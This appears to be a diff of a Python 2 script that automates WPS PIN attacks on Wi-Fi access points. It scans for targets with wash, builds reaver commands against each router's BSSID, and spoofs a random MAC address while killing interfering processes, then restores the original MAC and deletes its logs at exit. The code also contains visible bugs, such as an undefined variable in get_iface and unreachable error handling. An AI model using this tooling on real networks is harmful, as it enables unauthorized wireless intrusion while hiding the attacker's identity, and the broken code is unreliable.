@@ -4,6 +4,10 @@ import io
 import os
 from subprocess import Popen, PIPE, STDOUT
 import argparse
+import socket
+import random
+import struct
+import fcntl
 import re
 import time
 import sys
@@ -21,95 +25,116 @@ GR = '\033[37m' # gray
 T  = '\033[93m' # tan
 
 def parse_args():
-	#Create the arguments
+    '''
+	Create the arguments
+    '''
     parser = argparse.ArgumentParser()
-    parser.add_argument("-i", "--interface", help="Select the monitor mode enabled interface to use")
+    parser.add_argument("-i", "--interface", help="Select the interface to use")
     return parser.parse_args()
 
 def iwconfig():
     monitors = []
-    interfaces = {}
+    wifi_intfs = []
+
     try:
-        proc = Popen(['iwconfig'], stdout=PIPE, stderr=DN)
+        proc = Popen(['/sbin/iwconfig'], stdout=PIPE, stderr=DN)
     except OSError:
         sys.exit('['+R+'-'+W+'] Could not execute "iwconfig"')
+
     for line in proc.communicate()[0].split('\n'):
         if len(line) == 0: continue # Isn't an empty string
         if line[0] != ' ': # Doesn't start with space
-            wired_search = re.search('eth[0-9]|em[0-9]|p[1-9]p[1-9]', line)
-            if not wired_search: # Isn't wired
-                iface = line[:line.find(' ')] # is the interface
-                if 'Mode:Monitor' in line:
-                    monitors.append(iface)
-                elif 'IEEE 802.11' in line:
-                    if "ESSID:\"" in line:
-                        interfaces[iface] = 1
-                    else:
-                        interfaces[iface] = 0
-    return monitors, interfaces
+            iface = line[:line.find(' ')] # is the interface
+            if 'Mode:Monitor' in line:
+                monitors.append(iface)
+            elif 'IEEE 802.11' in line:
+                wifi_intfs.append(iface)
+
+    return monitors, wifi_intfs
 
 def get_mon_iface(args):
     '''
     Get the monitor mode interface name
     '''
-    monitors, interfaces = iwconfig()
+    # Kill any potentialy interfering programs
+    Popen('airmon-ng check kill'.split(), stdout=DN, stderr=DN)
+    monitors, wifi_intfs = iwconfig()
+
     if args.interface:
-        return args.interface
-    if len(monitors) > 0:
-        return monitors[0]
+        iface = args.interface
     else:
-        # Start monitor mode on a wireless interface
-        print '['+G+'*'+W+'] Finding the most powerful interface...'
-        interface = get_iface(interfaces)
-        monmode = start_mon_mode(interface)
-        return monmode
+        if len(monitors) > 0:
+            # Just use the first monitor mode interface
+            iface = monitors[0]
+        else:
+            iface = get_iface(wifi_intfs)
+
+    print iface
+    orig_mac = get_mac(iface)
+    print orig_mac
+    #Changes MAC and brings it up in monitor mode
+    rand_mac(iface)
+
+    return orig_mac, iface
 
 def start_mon_mode(interface):
+    '''
+    Starts monitor mode on the interface
+    '''
     print '['+G+'+'+W+'] Starting monitor mode on '+G+interface+W
     try:
-        os.system('ifconfig %s down' % interface)
-        os.system('iwconfig %s mode monitor' % interface)
-        os.system('ifconfig %s up' % interface)
+        Popen('airmon-ng check kill'.split(), stdout=DN, stderr=DN)
+        rand_mac(interface)
         return interface
     except Exception:
+        raise
         sys.exit('['+R+'-'+W+'] Could not start monitor mode')
 
-def get_iface(interfaces):
+def rand_mac(interface):
+    '''
+    https://www.centos.org/docs/5/html/5.2/Virtualization/
+    sect-Virtualization-Tips_and_tricks-Generating_a_new_unique_MAC_address.html
+    '''
+    os.system('/sbin/ip link set %s down' % interface)
+    mac = [ 0x00, 0x16, 0x3e,
+            random.randint(0x00, 0x7f),
+            random.randint(0x00, 0xff),
+            random.randint(0x00, 0xff) ]
+    mac = ':'.join(map(lambda x: "%02x" % x, mac))
+
+    os.system('/sbin/ip link set dev {} address {}'.format(interface, mac))
+    os.system('/sbin/iwconfig %s mode monitor' % interface)
+    os.system('/sbin/ip link set %s up' % interface)
+
+def get_iface(wifi_intfs):
+
+    if len(wifi_intfs) < 1:
+        sys.exit('['+R+'-'+W+'] No wireless interfaces found, bring one up and try again')
+
+    if len(wifi_intfs) == 1:
+        return interface[0]
+
+    return get_best_intf(wifi_intfs)
+
+def get_best_intf(wifi_intfs):
+    '''
+    Run iwlist and select wifi interface that returns most APs
+    '''
     scanned_aps = []
 
-    if len(interfaces) < 1:
-        sys.exit('['+R+'-'+W+'] No wireless interfaces found, bring one up and try again')
-    if len(interfaces) == 1:
-        for interface in interfaces:
-            return interface
-
-    # Find most powerful interface
-    for iface in interfaces:
+    for iface in wifi_intfs:
         count = 0
-        proc = Popen(['iwlist', iface, 'scan'], stdout=PIPE, stderr=DN)
+        proc = Popen(['/sbin/iwlist', iface, 'scan'], stdout=PIPE, stderr=DN)
         for line in proc.communicate()[0].split('\n'):
             if ' - Address:' in line: # first line in iwlist scan for a new AP
                count += 1
         scanned_aps.append((count, iface))
         print '['+G+'+'+W+'] Networks discovered by '+G+iface+W+': '+T+str(count)+W
-    try:
-        interface = max(scanned_aps)[1]
-        return interface
-    except Exception as e:
-        for iface in interfaces:
-            interface = iface
-            print '['+R+'-'+W+'] Minor error:',e
-            print '    Starting monitor mode on '+G+interface+W
-            return interface
 
-def remove_mon_iface(mon_iface):
-    print '1'
-    os.system('ifconfig %s down' % mon_iface)
-    os.system('iwconfig %s mode managed' % mon_iface)
-    os.system('ifconfig %s up' % mon_iface)
-    print '2'
+    # Returns the interface that found the most APs
+    return max(scanned_aps)[1]
 
-def get_wash_out(mon_iface):
+def get_wash_output(mon_iface):
     '''
     Get wash output
     '''
@@ -144,19 +169,34 @@ def run_reaver(targets, mon_iface):
         essid, chan, mac = t
         cmd = 'reaver -i {} -c {} -b {} -vv -S'.format(mon_iface, chan, mac)
 
+def get_mac(interface):
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    info = fcntl.ioctl(s.fileno(), 0x8927,  struct.pack('256s', interface[:15]))
+    return ':'.join(['%02x' % ord(char) for char in info[18:24]])
+
+def cleanup(orig_mac, mon_iface):
+    '''
+    Removes monitor mode, changes MAC back, restarts network-manager,
+    removes wash.log, and prints a closing message
+    '''
+    os.system('ifconfig %s down' % mon_iface)
+    os.system('/sbin/ip link set dev {} address {}'.format(mon_iface, orig_mac))
+    os.system('iwconfig %s mode managed' % mon_iface)
+    os.system('ifconfig %s up' % mon_iface)
+#    os.system('service network-manager restart')
+    os.system('rm wash.log')
+    sys.exit('\n['+R+'!'+W+'] Closing...')
+
 def main():
     args = parse_args()
-    mon_iface = get_mon_iface(args)
-    out = get_wash_out(mon_iface)
+    orig_mac, mon_iface = get_mon_iface(args)
+    out = get_wash_output(mon_iface)
     targets = get_targets(out)
     try:
         while 1:
             print targets
             time.sleep(1)
     except KeyboardInterrupt:
-        remove_mon_iface(mon_iface)
-        os.system('service network-manager restart')
-        os.system('rm wash.log')
-        sys.exit('\n['+R+'!'+W+'] Closing...')
+        cleanup(orig_mac, mon_iface)
 
 main()
